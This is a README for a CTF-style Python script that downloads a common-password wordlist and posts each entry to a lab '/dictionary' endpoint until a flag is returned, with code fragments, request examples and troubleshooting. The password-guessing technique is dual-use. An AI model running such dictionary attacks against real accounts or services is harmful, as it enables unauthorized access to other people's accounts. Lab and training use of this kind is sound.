# Dictionary Password Tester

A small Python script for testing a list of common passwords against a `/dictionary` endpoint in an **authorized lab, CTF, or security training environment**.

The script downloads a predefined password wordlist, submits each password to the target endpoint, and stops when the server returns a successful response containing a `flag`.

> **Important:** Use this script only against systems you own or have explicit authorization to test. Do not use it against third-party accounts, login services, or production systems without permission.

## Overview

The script performs the following process:

```text
Download password wordlist
          |
          v
Read passwords line by line
          |
          v
POST password to /dictionary
          |
          v
Inspect JSON response
          |
     +----+----+
     |         |
 No flag     Flag found
     |         |
     v         v
Next password  Stop
```

## Requirements

* Python 3
* `requests`
* Network access to the target lab instance
* Network access to download the configured wordlist

Install the Python dependency with:

```bash
pip install requests
```

Using a virtual environment is recommended:

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install requests
```

On Windows:

```powershell
.venv\Scripts\Activate.ps1
```

## Configuration

Before running the script, configure the target IP address and port:

```python
ip = "127.0.0.1"
port = 1234
```

### IP Address

Change:

```python
ip = "127.0.0.1"
```

to the address of your authorized lab or CTF instance.

For a locally running challenge, `127.0.0.1` may already be appropriate.

### Port

Change:

```python
port = 1234
```

to the port assigned to the challenge.

The resulting endpoint will be:

```text
http://127.0.0.1:1234/dictionary
```

with the default example configuration.

## Wordlist

The script downloads the `500-worst-passwords.txt` wordlist from the SecLists project.

The downloaded text is converted into individual password candidates using:

```python
passwords = requests.get(
    "https://raw.githubusercontent.com/danielmiessler/"
    "SecLists/refs/heads/master/Passwords/"
    "Common-Credentials/500-worst-passwords.txt"
).text.splitlines()
```

This means the script requires internet access in addition to connectivity to the challenge server.

## Usage

Save the script, for example, as:

```text
dictionary.py
```

Then run:

```bash
python3 dictionary.py
```

The script will begin testing passwords sequentially.

Example console output:

```text
Attempted password: 123456
Attempted password: password
Attempted password: 12345678
Attempted password: qwerty
...
```

## HTTP Request

For every password candidate, the script sends a POST request to:

```text
http://<ip>:<port>/dictionary
```

The password is submitted as form data:

```python
data={
    "password": password
}
```

Conceptually, the request looks like:

```http
POST /dictionary HTTP/1.1
Host: 127.0.0.1:1234
Content-Type: application/x-www-form-urlencoded

password=password123
```

## Success Detection

After each request, the script checks whether:

1. the HTTP response indicates success; and
2. the JSON response contains a `flag` property.

The relevant condition is:

```python
if response.ok and "flag" in response.json():
```

When both conditions are satisfied, the script prints the successful password:

```text
Correct password found: example-password
```

and the returned flag:

```text
Flag: example{...}
```

The loop then terminates.

## Expected Server Response

The script assumes that successful responses are JSON.

For example:

```json
{
    "flag": "example{challenge_completed}"
}
```

If the server returns a successful HTTP response that is not valid JSON, the current implementation may raise a JSON decoding exception.

## How It Works

### 1. Download the Wordlist

The script uses `requests.get()` to retrieve a list of common passwords.

```python
passwords = requests.get(...).text.splitlines()
```

Each line becomes one password candidate.

### 2. Iterate Through Passwords

A standard Python loop processes every candidate:

```python
for password in passwords:
```

The current candidate is displayed in the terminal:

```python
print(f"Attempted password: {password}")
```

### 3. Submit the Candidate

Each password is sent to the challenge:

```python
response = requests.post(
    f"http://{ip}:{port}/dictionary",
    data={"password": password}
)
```

### 4. Inspect the Response

The script checks the HTTP status and JSON body:

```python
if response.ok and "flag" in response.json():
```

If a flag is present, the correct password and flag are printed.

### 5. Stop After Success

The final:

```python
break
```

terminates the password loop after a successful result.

## Limitations

This is a minimal challenge-solving script rather than a general-purpose password auditing tool.

The current implementation:

* uses one fixed remote wordlist;
* sends requests sequentially;
* has no explicit request timeout;
* has no retry handling;
* assumes successful responses contain JSON;
* does not handle connection failures;
* does not validate the wordlist download;
* does not provide command-line arguments;
* prints every attempted password;
* assumes the endpoint is exactly `/dictionary`;
* assumes the parameter is named `password`;
* stops after finding the first response containing `flag`.

These assumptions are suitable for a simple controlled challenge but may need adjustment for other lab environments.

## Troubleshooting

### Connection Refused

If you receive a connection error, verify:

```python
ip = "127.0.0.1"
port = 1234
```

Make sure the challenge is running and the IP address and port are correct.

### Wordlist Cannot Be Downloaded

The script downloads its wordlist when it starts.

Verify that the machine running the script has internet access.

Alternatively, for an offline lab, the script can be modified to read a locally stored wordlist.

### JSON Decode Error

The script expects the endpoint to return JSON when checking:

```python
response.json()
```

If the challenge returns HTML, plain text, or another format, the response handling needs to be adapted to that challenge.

### No Password Found

If the script reaches the end of the list without printing a flag, the expected password may not be present in the configured wordlist, or the challenge may use a different success-response format.

## Responsible Use

This script is intended for:

* CTF challenges;
* intentionally vulnerable applications;
* local security labs;
* password-auditing exercises using test credentials;
* authorized penetration-testing environments;
* educational security exercises.

Do not use it for unauthorized password guessing against real user accounts or third-party services.

## Disclaimer

This project is provided for authorized security testing and educational purposes. You are responsible for ensuring that you have permission to test the target system.
